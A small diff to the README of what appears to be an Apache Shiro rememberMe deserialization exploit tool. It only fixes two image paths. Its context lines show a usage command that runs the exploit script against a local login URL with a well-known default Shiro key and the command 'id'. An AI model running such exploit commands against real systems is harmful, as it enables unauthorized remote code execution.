@@ -13,9 +13,9 @@ python shiro_rememberMe_Rce.py targetUrl shiroKey command
 python shiro_rememberMe_rce.py http://192.168.0.106:8080/login kPH+bIxk5D2deZiIxcaaaA== id
 ```
 
-![](assets/markdown-img-paste-20200725205353408.png)
+![](./assets/markdown-img-paste-20200725205353408.png)
 
-![](assets/markdown-img-paste-20200725205414673.png)
+![](./assets/markdown-img-paste-20200725205414673.png)
 
 ## 参考
 
